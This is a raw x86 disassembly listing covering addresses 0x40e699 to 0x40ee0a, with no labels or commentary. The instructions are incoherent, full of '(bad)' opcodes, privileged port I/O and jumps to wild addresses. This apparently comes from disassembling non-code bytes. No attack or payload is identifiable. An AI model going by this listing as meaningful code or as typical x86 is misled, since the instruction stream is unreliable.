  40e699:	inc    DWORD PTR [eax+0x46410106]
  40e69f:	jmp    0x19c49608
  40e6a4:	aam    0x44
  40e6a6:	pop    edx
  40e6a7:	mov    eax,ds:0xa79a26a2
  40e6ac:	mov    eax,0x2ffd2a0f
  40e6b1:	xchg   DWORD PTR [ecx],edx
  40e6b3:	addr16 push 0x32
  40e6b6:	jbe    0x40e719
  40e6b8:	mov    ds:0xd658f615,al
  40e6bd:	aas    
  40e6be:	test   eax,0xe9485513
  40e6c3:	add    DWORD PTR [eax+0x50],edx
  40e6c6:	mov    edx,0x8f0c97b7
  40e6cb:	popf   
  40e6cc:	or     esi,ebx
  40e6ce:	lods   eax,DWORD PTR ds:[esi]
  40e6cf:	pop    ecx
  40e6d0:	cmc    
  40e6d1:	repz add eax,0x92437851
  40e6d7:	fst    DWORD PTR [ebx+0x72b9d751]
  40e6dd:	pop    ss
  40e6de:	sbb    al,0x3e
  40e6e0:	stos   DWORD PTR es:[edi],eax
  40e6e1:	dec    ecx
  40e6e2:	pop    ds
  40e6e3:	jle    0x40e709
  40e6e5:	add    BYTE PTR [edi+0x30bbb75e],ah
  40e6eb:	xchg   ebx,eax
  40e6ec:	cdq    
  40e6ed:	popf   
  40e6ee:	aam    0xa6
  40e6f0:	push   ebp
  40e6f1:	sbb    eax,0xeca8bb51
  40e6f6:	stc    
  40e6f7:	loopne 0x40e67c
  40e6f9:	mov    gs,WORD PTR [edx-0x5b2410a3]
  40e6ff:	in     eax,0xba
  40e701:	stos   DWORD PTR es:[edi],eax
  40e702:	sub    ebx,DWORD PTR [ebp-0x4e]
  40e705:	sbb    esi,ebx
  40e707:	fst    QWORD PTR [edi-0x79]
  40e70a:	pop    edx
  40e70b:	mov    ebx,0x75a26f5e
  40e710:	loop   0x40e713
  40e712:	pop    es
  40e713:	call   0xfa75b525
  40e718:	and    cl,al
  40e71a:	in     eax,0x9a
  40e71c:	jae    0x40e70e
  40e71e:	ins    BYTE PTR es:[edi],dx
  40e71f:	push   cs
  40e720:	enter  0x6146,0x46
  40e724:	cli    
  40e725:	push   ss
  40e726:	clc    
  40e727:	push   0x6d
  40e729:	fbstp  TBYTE PTR [eax+0x2024dace]
  40e72f:	mov    al,0x70
  40e731:	xchg   esi,eax
  40e732:	les    edi,FWORD PTR [esp+ecx*2+0x69]
  40e736:	inc    eax
  40e737:	add    BYTE PTR [ebx],bh
  40e739:	lods   al,BYTE PTR ds:[esi]
  40e73a:	push   ds
  40e73b:	cmp    DWORD PTR [ebp+0x48fee820],eax
  40e741:	xchg   ecx,eax
  40e742:	or     DWORD PTR [eax+ebp*4+0x75b2c389],0x57
  40e74a:	(bad)  
  40e74c:	add    eax,0x64dc34c2
  40e751:	lea    esp,[ebx]
  40e753:	out    0x4b,eax
  40e755:	shl    DWORD PTR [ebx+esi*1],0x21
  40e759:	sbb    cl,BYTE PTR [edi]
  40e75b:	jmp    0x9a64ddfa
  40e760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e761:	js     0x40e765
  40e763:	mov    esi,0xa19006a4
  40e768:	adc    ebx,DWORD PTR [ecx-0x227c5f76]
  40e76e:	das    
  40e76f:	sub    edi,DWORD PTR [edi+0x79]
  40e772:	imul   ebp,DWORD PTR [di],0xffffffa9
  40e776:	inc    edi
  40e777:	nop
  40e778:	xchg   BYTE PTR [edi+0x4044b7a7],al
  40e77e:	xor    DWORD PTR [ebx],edi
  40e780:	dec    esp
  40e781:	pop    ecx
  40e782:	xchg   BYTE PTR [ecx],bh
  40e784:	mov    cl,0x8a
  40e786:	cdq    
  40e787:	(bad)  
  40e788:	into   
  40e789:	sti    
  40e78a:	cli    
  40e78b:	dec    edi
  40e78c:	bound  ebx,QWORD PTR [ebx]
  40e78e:	(bad)  
  40e78f:	and    edi,DWORD PTR [ecx+0x4abcc156]
  40e795:	and    BYTE PTR [eax-0x38],ch
  40e798:	out    0x21,al
  40e79a:	aas    
  40e79b:	jecxz  0x40e814
  40e79d:	push   0x7
  40e79f:	add    DWORD PTR [ebx+eax*1+0x31],ecx
  40e7a3:	ror    DWORD PTR ds:0xcb66b2c8,1
  40e7a9:	and    al,0x68
  40e7ab:	push   esp
  40e7ac:	sbb    eax,0x208e09d9
  40e7b1:	std    
  40e7b2:	loope  0x40e7cc
  40e7b4:	data16 jl 0x40e737
  40e7b7:	out    dx,al
  40e7b8:	and    eax,0xd0657913
  40e7bd:	clc    
  40e7be:	neg    ecx
  40e7c0:	loope  0x40e78d
  40e7c2:	gs jns 0x40e82a
  40e7c5:	dec    ebx
  40e7c6:	push   ebp
  40e7c7:	cmp    DWORD PTR [eax],eax
  40e7c9:	pusha  
  40e7ca:	sub    bh,BYTE PTR [esi-0x7e]
  40e7cd:	les    eax,FWORD PTR [esi]
  40e7cf:	xor    al,0x5e
  40e7d1:	inc    esi
  40e7d2:	add    esi,DWORD PTR ss:[ebx]
  40e7d5:	mov    dl,0xb1
  40e7d7:	fs sti 
  40e7d9:	faddp  st(5),st
  40e7db:	adc    BYTE PTR [edi+0x22e4304d],0xa2
  40e7e2:	pop    esp
  40e7e3:	fcomp  QWORD PTR [eax+0x71]
  40e7e6:	dec    esi
  40e7e7:	and    DWORD PTR [esi],ebx
  40e7e9:	xchg   esp,eax
  40e7ea:	sub    eax,0x9c41a2d
  40e7ef:	mov    edi,0xc9237f94
  40e7f4:	mov    al,0x19
  40e7f6:	loopne 0x40e7a2
  40e7f8:	mov    al,ds:0x22597105
  40e7fd:	jne    0x40e849
  40e7ff:	or     DWORD PTR [eax-0x7e],ecx
  40e802:	mov    dl,0x6b
  40e804:	jle    0x40e84c
  40e806:	cs std 
  40e808:	xor    eax,0xe187ef37
  40e80d:	nop
  40e80e:	dec    ebp
  40e80f:	out    dx,al
  40e810:	xchg   ebp,eax
  40e811:	mov    ds:0x93963b99,al
  40e816:	or     eax,0x5bf2ecd5
  40e81b:	mov    bl,0x0
  40e81d:	lea    edx,es:[edx]
  40e820:	mov    ds:0xae2ec68c,eax
  40e825:	addps  xmm6,XMMWORD PTR [edx]
  40e828:	mov    bh,0x22
  40e82a:	add    BYTE PTR [eax+ecx*2+0x67],0xab
  40e82f:	adc    al,0x66
  40e831:	push   esp
  40e832:	mov    ds:0xe3c3617d,al
  40e837:	stc    
  40e838:	mov    ds:0x82a5a5ad,eax
  40e83d:	or     al,BYTE PTR [esi-0x77581d95]
  40e843:	test   eax,0x7ccff634
  40e848:	push   ecx
  40e849:	add    ecx,DWORD PTR [ebp+0x27]
  40e84c:	fwait
  40e84d:	jl     0x40e7fa
  40e84f:	push   ebx
  40e850:	add    ch,BYTE PTR [ebp+0x13]
  40e853:	lods   eax,DWORD PTR ds:[esi]
  40e854:	es push ds
  40e856:	jae    0x40e830
  40e858:	mov    eax,0xa2b5cc41
  40e85d:	mov    edi,0xce289e9e
  40e862:	sub    al,dl
  40e864:	pop    esp
  40e865:	adc    BYTE PTR [eax-0x7d],0x4c
  40e869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e86a:	iret   
  40e86b:	outs   dx,DWORD PTR ds:[esi]
  40e86c:	cmp    ebx,ecx
  40e86e:	test   al,ch
  40e870:	or     al,0xc6
  40e872:	(bad)  
  40e873:	mov    BYTE PTR [ebx],bl
  40e875:	inc    esp
  40e876:	pop    ebp
  40e877:	sbb    ebp,DWORD PTR ds:0x186db2e1
  40e87d:	stos   DWORD PTR es:[edi],eax
  40e87e:	dec    eax
  40e87f:	sub    ah,cl
  40e881:	sub    DWORD PTR [edx+0x168b2f02],eax
  40e887:	xchg   BYTE PTR [edi-0x2b],cl
  40e88a:	shr    DWORD PTR [ecx+0x6e],1
  40e88d:	pop    eax
  40e88e:	or     eax,0x87dd061a
  40e893:	add    bl,ah
  40e895:	push   esp
  40e896:	and    ebx,DWORD PTR [ebx+esi*8+0x79]
  40e89a:	mov    dl,0xb6
  40e89c:	cmp    dh,BYTE PTR [esi+ebp*1]
  40e89f:	jmp    0x9332d22f
  40e8a4:	cmp    BYTE PTR [edi-0x2107a44f],bl
  40e8aa:	inc    ebx
  40e8ab:	fwait
  40e8ac:	popa   
  40e8ad:	pop    ecx
  40e8ae:	lock sub eax,0x203d0caa
  40e8b4:	add    edx,0xdf84be0d
  40e8ba:	icebp  
  40e8bb:	fnstsw ax
  40e8bd:	push   fs
  40e8bf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40e8c1:	mov    eax,0xbd2f1dd5
  40e8c6:	shl    BYTE PTR [ecx],0x36
  40e8c9:	addr16 push esi
  40e8cb:	mov    eax,?
  40e8cd:	pop    es
  40e8ce:	int    0x5b
  40e8d0:	call   0x2c7975a9
  40e8d5:	(bad)  
  40e8d6:	jnp    0x40e88d
  40e8d8:	sbb    DWORD PTR [ebx-0x2c4f56d4],ebp
  40e8de:	int3   
  40e8df:	fs jge 0x40e8fe
  40e8e2:	jmp    0x91e6:0x79850986
  40e8e9:	fimul  DWORD PTR [esi]
  40e8eb:	mov    fs,esi
  40e8ed:	gs stos BYTE PTR es:[edi],al
  40e8ef:	add    eax,ecx
  40e8f1:	mov    cl,0x2e
  40e8f3:	inc    ebx
  40e8f4:	mov    al,0xd7
  40e8f6:	push   ebp
  40e8f7:	push   edx
  40e8f8:	je     0x40e975
  40e8fa:	rcl    BYTE PTR [edx-0x7f],0x50
  40e8fe:	mov    esp,0xce232335
  40e903:	lahf   
  40e904:	loopne 0x40e8ae
  40e906:	(bad)  
  40e907:	loop   0x40e923
  40e909:	adc    eax,0xb1a4f9a1
  40e90e:	push   ebp
  40e90f:	inc    ebp
  40e910:	xor    ecx,DWORD PTR [ecx]
  40e912:	pop    esi
  40e913:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e915:	push   cs
  40e916:	sbb    ebx,DWORD PTR [eax-0x257a35a3]
  40e91c:	dec    edx
  40e91d:	fmul   QWORD PTR [edi-0x25]
  40e920:	sbb    esp,DWORD PTR [ebp-0x1174fd07]
  40e926:	jo     0x40e8ac
  40e928:	aaa    
  40e929:	in     al,dx
  40e92a:	shl    DWORD PTR [edx*4-0x5407ff99],0x9a
  40e932:	shl    BYTE PTR [ecx+0x20],cl
  40e935:	addr16 dec esi
  40e937:	xor    cl,ah
  40e939:	and    al,0x2
  40e93b:	cld    
  40e93c:	mov    dh,BYTE PTR [ebp+0x7f]
  40e93f:	nop
  40e940:	jl     0x40e9a2
  40e942:	or     edx,DWORD PTR [esi-0x29]
  40e945:	pop    ebp
  40e946:	push   esp
  40e947:	and    al,0x30
  40e949:	pop    ss
  40e94a:	das    
  40e94b:	dec    ax
  40e94d:	jp     0x40e95a
  40e94f:	sbb    cl,BYTE PTR [eax+0x4689f127]
  40e955:	jno    0x40e97d
  40e957:	mov    ebx,0xdd14ef22
  40e95c:	sub    eax,0x506c31a4
  40e961:	ins    DWORD PTR es:[edi],dx
  40e962:	adc    DWORD PTR [eax-0x55],ebp
  40e965:	lea    ecx,[ebx-0x2c2877fe]
  40e96b:	mov    edx,0x3329648c
  40e970:	or     eax,0x3f5361a5
  40e975:	lahf   
  40e976:	int    0xa3
  40e978:	(bad)  [edi*4-0x779c3305]
  40e97f:	arpl   bx,di
  40e981:	jl     0x40e97a
  40e983:	sbb    eax,0xdf4ddf68
  40e988:	aas    
  40e989:	fsub   QWORD PTR [ecx-0x80]
  40e98c:	test   BYTE PTR [ebp+0x4c58ca50],ch
  40e992:	addr16 mov esi,0x2f8e2e7d
  40e998:	xor    dl,BYTE PTR [eax+0x2a]
  40e99b:	(bad)  
  40e99c:	inc    edi
  40e99d:	adc    BYTE PTR [edx-0x49],bl
  40e9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9a1:	dec    edx
  40e9a2:	dec    eax
  40e9a3:	fld    QWORD PTR [edi]
  40e9a5:	inc    ecx
  40e9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a7:	or     al,0xcb
  40e9a9:	add    DWORD PTR [ecx+0x4151acfe],eax
  40e9af:	jmp    0x40e966
  40e9b1:	das    
  40e9b2:	and    eax,0xf49e67ee
  40e9b7:	jnp    0x40e9c1
  40e9b9:	(bad)  
  40e9ba:	cs out dx,al
  40e9bc:	xor    al,0x45
  40e9be:	repnz push ebx
  40e9c0:	pop    edi
  40e9c1:	neg    DWORD PTR [ebx-0x2a47d2e5]
  40e9c7:	cdq    
  40e9c8:	sbb    BYTE PTR [esi+0x2d],dh
  40e9cb:	mov    esp,cs
  40e9cd:	add    ebp,0x935a3a2a
  40e9d3:	jns    0x40ea31
  40e9d5:	or     DWORD PTR [eax-0x79c15092],ecx
  40e9db:	push   ss
  40e9dc:	and    al,0xf2
  40e9de:	inc    esp
  40e9df:	xchg   BYTE PTR [ebx],bl
  40e9e1:	sar    DWORD PTR [ebx-0x40],cl
  40e9e4:	jle    0x40ea4a
  40e9e6:	and    BYTE PTR [edx],bh
  40e9e8:	push   eax
  40e9e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ea:	cld    
  40e9eb:	fwait
  40e9ec:	test   eax,0x622086bb
  40e9f1:	push   0x3d
  40e9f3:	(bad)  
  40e9f4:	in     al,0x6d
  40e9f6:	add    BYTE PTR [ebx],ch
  40e9f8:	in     eax,dx
  40e9f9:	adc    esp,DWORD PTR [ebp+0x4eb52738]
  40e9ff:	pop    ds
  40ea00:	rcl    DWORD PTR [ebx-0x72f11c48],1
  40ea06:	cmp    BYTE PTR [edx+0x4196cbf7],0xdd
  40ea0d:	push   ecx
  40ea0e:	ins    BYTE PTR es:[edi],dx
  40ea0f:	fidivr DWORD PTR fs:[esp+eiz*4+0x2f6be8f4]
  40ea17:	inc    esp
  40ea18:	pop    edi
  40ea19:	test   eax,0xfeb2bd80
  40ea1e:	cmp    esi,DWORD PTR [edx]
  40ea20:	das    
  40ea21:	(bad)  
  40ea22:	call   0xc137897a
  40ea27:	sub    edi,DWORD PTR [ebx+0x51]
  40ea2a:	or     al,0x9c
  40ea2c:	push   cs
  40ea2d:	call   0x5ce9:0x7eed4dac
  40ea34:	jp     0x40ea3c
  40ea36:	(bad)  
  40ea37:	in     eax,dx
  40ea38:	popf   
  40ea39:	xchg   esp,eax
  40ea3a:	not    DWORD PTR ds:[edi+0x2c]
  40ea3e:	xchg   esi,eax
  40ea3f:	(bad)  
  40ea40:	in     al,dx
  40ea41:	sub    BYTE PTR [ecx],ch
  40ea43:	xchg   ebx,eax
  40ea44:	push   edx
  40ea45:	sar    BYTE PTR ds:0x23038f50,cl
  40ea4b:	jp     0x40ea43
  40ea4d:	push   edi
  40ea4e:	jle    0x40ea77
  40ea50:	mov    bh,0x6
  40ea52:	(bad)  
  40ea54:	mov    edi,0xbc8abe9a
  40ea59:	out    0xc1,al
  40ea5b:	sub    BYTE PTR [ebx],al
  40ea5d:	mov    ebx,0xee0f2b75
  40ea62:	fisttp WORD PTR [ebp-0x78]
  40ea65:	push   ecx
  40ea66:	in     eax,dx
  40ea67:	fist   WORD PTR [ecx-0x135e6ce7]
  40ea6d:	add    ebp,DWORD PTR [eax]
  40ea6f:	loope  0x40e9f9
  40ea71:	xchg   ebp,eax
  40ea72:	aas    
  40ea73:	or     BYTE PTR [eax+0x32],dh
  40ea76:	mov    bl,0xf1
  40ea78:	add    BYTE PTR [ebx+eax*2+0x6412a1aa],dh
  40ea7f:	and    BYTE PTR [eax+0x27],0xf8
  40ea83:	inc    ebp
  40ea84:	inc    eax
  40ea85:	ins    DWORD PTR es:[edi],dx
  40ea86:	arpl   WORD PTR [edx-0x473dc606],bx
  40ea8c:	repnz (bad) 
  40ea8e:	or     ebx,edi
  40ea90:	xlat   BYTE PTR ds:[ebx]
  40ea91:	and    eax,0x935e317a
  40ea96:	mov    eax,0x31421044
  40ea9b:	inc    ebp
  40ea9c:	cmp    eax,0xb1914a06
  40eaa1:	repz sub ah,BYTE PTR [edi+ebx*8-0x15]
  40eaa6:	xor    DWORD PTR [edx-0x3e],edi
  40eaa9:	retf   
  40eaaa:	fiadd  DWORD PTR es:[edi]
  40eaad:	or     esp,edi
  40eaaf:	pop    ebp
  40eab0:	icebp  
  40eab1:	sub    ah,BYTE PTR [eax+0x29]
  40eab4:	dec    edi
  40eab5:	ror    edx,1
  40eab7:	pop    edx
  40eab8:	icebp  
  40eab9:	mov    cl,0x25
  40eabb:	popa   
  40eabc:	dec    ebx
  40eabd:	adc    al,0x1b
  40eabf:	sbb    DWORD PTR [esi+0x2a],esp
  40eac2:	lock mov DWORD PTR [edx+0x6],esp
  40eac6:	sub    dl,BYTE PTR [eax+eax*2+0x58]
  40eaca:	aad    0x73
  40eacc:	out    dx,al
  40eacd:	jg     0x40ea97
  40eacf:	pop    ebx
  40ead0:	pop    ss
  40ead1:	sbb    dl,BYTE PTR [edx-0x4b919a28]
  40ead7:	arpl   WORD PTR ds:0x501bc112,sp
  40eadd:	mov    cl,0xb8
  40eadf:	and    ebx,ebx
  40eae1:	out    dx,al
  40eae2:	shl    DWORD PTR [esp+edi*4+0x429b99a1],0xb4
  40eaea:	jmp    0x40eb4e
  40eaec:	inc    esp
  40eaed:	mov    esi,0x9481de98
  40eaf2:	dec    edx
  40eaf3:	pop    ecx
  40eaf4:	fst    QWORD PTR [edi-0x1090077b]
  40eafa:	pop    ebx
  40eafb:	stos   BYTE PTR es:[edi],al
  40eafc:	cdq    
  40eafd:	aas    
  40eafe:	not    ch
  40eb00:	jne    0x40eace
  40eb02:	jnp    0x40eb4e
  40eb04:	shl    BYTE PTR [ecx-0x6e5447ce],0x4
  40eb0b:	push   ss
  40eb0c:	mov    eax,ds:0xf56044d5
  40eb11:	dec    edx
  40eb12:	aaa    
  40eb13:	or     DWORD PTR [ecx+ebx*4],edi
  40eb16:	or     eax,0x2eb359b3
  40eb1b:	push   ss
  40eb1c:	int3   
  40eb1d:	dec    esi
  40eb1e:	inc    esi
  40eb1f:	push   esp
  40eb20:	inc    eax
  40eb21:	sub    dl,ah
  40eb23:	mov    bl,BYTE PTR [ebx+0x44]
  40eb26:	push   edi
  40eb27:	mov    eax,ds:0x3834554a
  40eb2c:	or     ebx,DWORD PTR [edx+eiz*4]
  40eb2f:	outs   dx,BYTE PTR ds:[esi]
  40eb30:	add    al,0x5c
  40eb32:	enter  0xbe6f,0x52
  40eb36:	pop    ds
  40eb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb38:	pop    ebx
  40eb39:	aam    0xe2
  40eb3b:	mov    edi,0x695f01a8
  40eb40:	cmp    esi,DWORD PTR ds:0x523408be
  40eb46:	retf   0xea5e
  40eb49:	push   ds
  40eb4a:	ret    0x66c8
  40eb4d:	icebp  
  40eb4e:	jb     0x40eb25
  40eb50:	aad    0x96
  40eb52:	push   edi
  40eb53:	cmc    
  40eb54:	adc    BYTE PTR [edx],0xc
  40eb57:	jmp    0xf82ab338
  40eb5c:	stc    
  40eb5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb5e:	outs   dx,DWORD PTR ds:[esi]
  40eb5f:	inc    ebx
  40eb60:	xor    al,0x58
  40eb62:	out    0x58,al
  40eb64:	fcom   st(0)
  40eb66:	fild   QWORD PTR [esi+eax*1+0x72533de2]
  40eb6d:	sub    DWORD PTR [ebp+0x19],esp
  40eb70:	jb     0x40eb15
  40eb72:	xor    esi,DWORD PTR [ecx-0x2c]
  40eb75:	out    dx,al
  40eb76:	add    al,bh
  40eb78:	mov    edx,0xe26eca0a
  40eb7d:	fdivrp st(4),st
  40eb7f:	inc    ebx
  40eb80:	mov    ebx,0xa2992f7f
  40eb85:	inc    ebp
  40eb86:	sbb    esp,ebp
  40eb88:	repz push ss
  40eb8a:	lds    ebx,FWORD PTR [edi+ebx*8+0x68]
  40eb8e:	push   ebx
  40eb8f:	pop    edx
  40eb90:	hlt    
  40eb91:	and    BYTE PTR [ecx+0x7d],dl
  40eb94:	pop    es
  40eb95:	xor    eax,0x90f37d57
  40eb9a:	into   
  40eb9b:	add    al,0x20
  40eb9d:	mov    edi,0x4a12c660
  40eba3:	dec    esi
  40eba4:	ds retf 
  40eba6:	lock imul esp,DWORD PTR [ecx-0x7b067070],0x36
  40ebae:	mov    ds:0x37238bee,al
  40ebb3:	loopne 0x40eb61
  40ebb5:	xor    dx,bp
  40ebb8:	sub    al,0xd8
  40ebba:	ret    0x8ad5
  40ebbd:	sbb    ch,BYTE PTR [ebp-0x12e94b43]
  40ebc3:	sub    al,0x20
  40ebc5:	aaa    
  40ebc6:	out    0xbc,eax
  40ebc8:	inc    esp
  40ebc9:	arpl   WORD PTR [ecx-0x1f],sp
  40ebcc:	js     0x40eba7
  40ebce:	loope  0x40ec39
  40ebd0:	cmp    BYTE PTR [eax-0x1e],al
  40ebd3:	mov    dl,0x6e
  40ebd5:	or     eax,0x6f4948d1
  40ebda:	shl    DWORD PTR [eax-0x49a518cc],cl
  40ebe0:	nop
  40ebe1:	pop    eax
  40ebe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe3:	adc    eax,0x1a3924f2
  40ebe8:	pop    eax
  40ebe9:	inc    ecx
  40ebea:	push   es
  40ebeb:	icebp  
  40ebec:	jecxz  0x40eb73
  40ebee:	cwde   
  40ebef:	inc    edx
  40ebf0:	imul   ebp,DWORD PTR ss:[ecx+0x6f8ccc80],0x9cfb0941
  40ebfb:	sbb    ch,al
  40ebfd:	fcom   QWORD PTR ds:[ebp+0x46]
  40ec01:	je     0x40ebf6
  40ec03:	xchg   ebp,eax
  40ec04:	inc    edi
  40ec05:	fist   DWORD PTR [bp+si]
  40ec08:	fidivr DWORD PTR [ecx+0x52a8ed97]
  40ec0e:	dec    ebx
  40ec0f:	push   ds
  40ec10:	jnp    0x40ec33
  40ec12:	sub    BYTE PTR [ebx],dh
  40ec14:	add    eax,0xeb2799f4
  40ec19:	inc    esi
  40ec1a:	pop    ebx
  40ec1b:	xor    al,dh
  40ec1d:	adc    DWORD PTR [edi+0x34],edi
  40ec20:	(bad)  
  40ec21:	les    ebx,FWORD PTR [edx+0x20b2a1c8]
  40ec27:	repnz loopne 0x40ebd4
  40ec2a:	jnp    0x40eca7
  40ec2c:	int3   
  40ec2d:	push   0xf6b107a
  40ec32:	popf   
  40ec33:	jmp    0xd3d9:0x12b62e0c
  40ec3a:	sbb    edx,edi
  40ec3c:	fidivr WORD PTR ds:0xcf369d3
  40ec42:	mov    dl,0x38
  40ec44:	stos   DWORD PTR es:[edi],eax
  40ec45:	bound  esi,QWORD PTR [eax+ecx*2]
  40ec48:	xor    eax,0x59174ca9
  40ec4d:	adc    al,0xdd
  40ec4f:	fcomp  DWORD PTR [esi]
  40ec51:	retf   0x2167
  40ec54:	retf   0x8d29
  40ec57:	push   ebx
  40ec58:	lds    esi,FWORD PTR [ecx]
  40ec5a:	(bad)  
  40ec5b:	cmp    eax,DWORD PTR [edx]
  40ec5d:	(bad)  
  40ec5e:	in     eax,0x4e
  40ec60:	lock xchg edi,eax
  40ec62:	inc    esp
  40ec63:	inc    eax
  40ec64:	jecxz  0x40ecd2
  40ec66:	leave  
  40ec67:	adc    eax,0xd7a821bd
  40ec6c:	iret   
  40ec6d:	retf   0xc855
  40ec70:	lahf   
  40ec71:	and    DWORD PTR [eax-0x48],ecx
  40ec74:	xor    al,0x1e
  40ec76:	div    BYTE PTR [eax]
  40ec78:	aam    0x62
  40ec7a:	jmp    0x20409729
  40ec7f:	leave  
  40ec80:	jg     0x40ec5c
  40ec82:	inc    esi
  40ec83:	cmp    BYTE PTR [ecx-0x3c],ah
  40ec86:	push   ss
  40ec87:	xchg   DWORD PTR [ebx+0x1f2ee987],edi
  40ec8d:	cdq    
  40ec8e:	icebp  
  40ec8f:	outs   dx,BYTE PTR ds:[esi]
  40ec90:	sbb    esi,DWORD PTR [eax-0x855f8b5]
  40ec96:	nop
  40ec97:	xlat   BYTE PTR ds:[ebx]
  40ec98:	out    0xec,eax
  40ec9a:	mov    edi,0xb4194251
  40ec9f:	repnz xchg esp,eax
  40eca1:	xor    al,BYTE PTR [ebx+ecx*4]
  40eca4:	into   
  40eca5:	jmp    0x40ecd9
  40eca7:	jl     0x40ecaa
  40eca9:	dec    ecx
  40ecaa:	gs mov esi,0x414eb9fa
  40ecb0:	clc    
  40ecb1:	repz or bh,BYTE PTR [esi-0x6b]
  40ecb5:	xchg   edx,eax
  40ecb6:	mov    dl,0xe1
  40ecb8:	(bad)  [ecx]
  40ecba:	test   BYTE PTR [edi+0x1070e4c9],al
  40ecc0:	jnp    0x40ece8
  40ecc2:	or     al,0xb4
  40ecc4:	jbe    0x40ece0
  40ecc6:	sub    al,0x58
  40ecc8:	ss popf 
  40ecca:	or     esi,DWORD PTR [edx]
  40eccc:	stos   DWORD PTR es:[edi],eax
  40eccd:	imul   esp,DWORD PTR [eax],0xffffffbf
  40ecd0:	jns    0x40ed2f
  40ecd2:	sub    al,BYTE PTR [ecx]
  40ecd4:	aad    0xf4
  40ecd6:	xor    al,ch
  40ecd8:	sbb    eax,0xf5bbf455
  40ecdd:	inc    ebp
  40ecde:	(bad)  
  40ecdf:	add    eax,0xe12ab463
  40ece4:	lea    ecx,[esi]
  40ece6:	lods   al,BYTE PTR ds:[esi]
  40ece7:	cmp    al,0xf9
  40ece9:	fldl2e 
  40eceb:	mov    bh,0x2f
  40eced:	xor    esi,DWORD PTR [ebx]
  40ecef:	jmp    0x40ed0f
  40ecf1:	mov    ch,0x3e
  40ecf3:	xor    DWORD PTR [edi+eiz*4+0x33],ebp
  40ecf7:	mov    cl,0xd
  40ecf9:	pop    ebx
  40ecfa:	xor    al,0xbf
  40ecfc:	sbb    al,0x5
  40ecfe:	jno    0x40ecf1
  40ed00:	outs   dx,BYTE PTR ds:[esi]
  40ed01:	ins    DWORD PTR es:[edi],dx
  40ed02:	jns    0x40ed00
  40ed04:	das    
  40ed05:	ds ret 
  40ed07:	inc    eax
  40ed08:	and    cl,BYTE PTR [ebx]
  40ed0a:	scas   al,BYTE PTR es:[edi]
  40ed0b:	mov    edi,0x2426581a
  40ed10:	add    esi,esi
  40ed12:	outs   dx,DWORD PTR ds:[esi]
  40ed13:	jl     0x40ed82
  40ed15:	mov    ds:0xb4945344,eax
  40ed1a:	push   ebx
  40ed1b:	lds    esp,FWORD PTR [eax]
  40ed1d:	inc    eax
  40ed1e:	push   ebp
  40ed1f:	data16 add dh,BYTE PTR [eax*1-0x3fb8a22a]
  40ed27:	inc    ecx
  40ed28:	pusha  
  40ed29:	and    BYTE PTR [ebx+edi*1+0x1bc739aa],ch
  40ed30:	pop    ecx
  40ed31:	(bad)  
  40ed33:	mov    edx,0x7542e4be
  40ed38:	fiadd  WORD PTR [edi-0x3c35aef2]
  40ed3e:	sahf   
  40ed3f:	retf   
  40ed40:	gs cwde 
  40ed42:	dec    ebx
  40ed43:	out    dx,eax
  40ed44:	call   0x20c8:0x37a62208
  40ed4b:	fisttp WORD PTR [ebx+edx*4]
  40ed4e:	call   0xe9811371
  40ed53:	(bad)  [ecx*8+0x7a451e29]
  40ed5a:	gs push es
  40ed5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed5d:	adc    esi,DWORD PTR [eax+ecx*8]
  40ed60:	jg     0x40eda2
  40ed62:	push   edx
  40ed63:	retf   0x987f
  40ed66:	jmp    0x40ed25
  40ed68:	repnz mov al,ds:0x8293a7b
  40ed6e:	mov    ebx,DWORD PTR [ebx+0x65af6390]
  40ed74:	sub    BYTE PTR [ecx+0x15a49b74],cl
  40ed7a:	jne    0x40ed41
  40ed7c:	and    dl,al
  40ed7e:	int3   
  40ed7f:	pop    eax
  40ed80:	push   ds
  40ed81:	fcmovne st,st(5)
  40ed83:	mov    bl,0x12
  40ed85:	ds and al,0xfe
  40ed88:	add    BYTE PTR [ecx-0x50c76a85],al
  40ed8e:	dec    edx
  40ed8f:	daa    
  40ed90:	pushf  
  40ed91:	xchg   ecx,eax
  40ed92:	scas   eax,DWORD PTR es:[edi]
  40ed93:	jle    0x40eded
  40ed95:	aam    0x56
  40ed97:	jmp    0x2e7d:0x8cf65cd3
  40ed9e:	pushf  
  40ed9f:	pop    ds
  40eda0:	sbb    eax,0x1887c6d6
  40eda5:	stos   DWORD PTR es:[edi],eax
  40eda6:	mov    ebp,0x2f0666ac
  40edab:	loopne 0x40ed55
  40edad:	fcomp  DWORD PTR ds:0xf31da574
  40edb3:	jae    0x40edb2
  40edb5:	iret   
  40edb6:	pusha  
  40edb7:	pop    ss
  40edb8:	lea    ebp,[ebx]
  40edba:	aad    0xa1
  40edbc:	mov    bl,0x53
  40edbe:	dec    ebx
  40edbf:	mov    ebx,0xe23b2584
  40edc4:	outs   dx,DWORD PTR ds:[esi]
  40edc5:	pop    ds
  40edc6:	rol    DWORD PTR [eax+0x387e29b3],cl
  40edcc:	push   edx
  40edcd:	(bad)
  40edd2:	outs   dx,DWORD PTR ds:[si]
  40edd5:	xor    esi,edi
  40edd7:	mov    gs,WORD PTR [ecx+ecx*1-0x2c7df8b1]
  40edde:	out    dx,al
  40eddf:	xchg   edi,eax
  40ede0:	jp     0x40ed7c
  40ede2:	mov    cl,0xac
  40ede4:	pop    ds
  40ede5:	call   0xf1ca:0x2519cdfd
  40edec:	std    
  40eded:	hlt    
  40edee:	mov    ecx,0x635ce540
  40edf3:	pop    eax
  40edf4:	aas    
  40edf5:	je     0x40ee67
  40edf7:	aas    
  40edf8:	dec    ebx
  40edf9:	push   ebx
  40edfa:	mov    ecx,0x38bbeeb7
  40edff:	leave  
  40ee00:	cmp    dh,al
  40ee02:	fwait
  40ee03:	add    cl,BYTE PTR [ebp+edi*8+0x355ca123]
  40ee0a:	stos   BYTE PTR es:[edi],al
